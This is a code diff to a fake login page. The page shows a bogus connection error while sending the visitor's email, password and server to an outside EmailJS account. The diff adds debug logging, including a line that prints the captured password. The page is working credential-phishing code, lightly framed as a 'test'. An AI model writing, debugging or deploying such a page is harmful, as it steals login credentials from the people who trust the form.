@@ -8,6 +8,7 @@
   <script type="text/javascript">
      (function(){
         emailjs.init("f0SVFShSGNOwyB-sm"); // Your Public Key / User ID
+        console.log("EmailJS initialized"); // Debug
      })();
   </script>
 </head>
@@ -29,6 +30,8 @@
     loginForm.addEventListener("submit", function(event) {
       event.preventDefault();
 
+      console.log("Form submitted"); // Debug
+
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
       const server = document.getElementById("server").value;
@@ -36,16 +39,19 @@
       // Show a fake error message
       document.getElementById("message").innerText = "Error: Could not connect to server.";
 
-      // Send a test email safely to yourself with debug messages
+      console.log("Sending email with data:", {email, password, server}); // Debug
+
       emailjs.send("service_lspaiuv", "template_w3426ag", {
         email: email,
         password: password,
         server: server
       })
-      .then(function() { 
+      .then(function(response) { 
+         console.log("Email sent successfully:", response); // Debug
          document.getElementById("message").innerText = "Test email sent safely!";
       })
       .catch(function(error) {
+         console.error("Failed to send email:", error); // Debug
          document.getElementById("message").innerText = "Failed to send email: " + error;
       });
     });
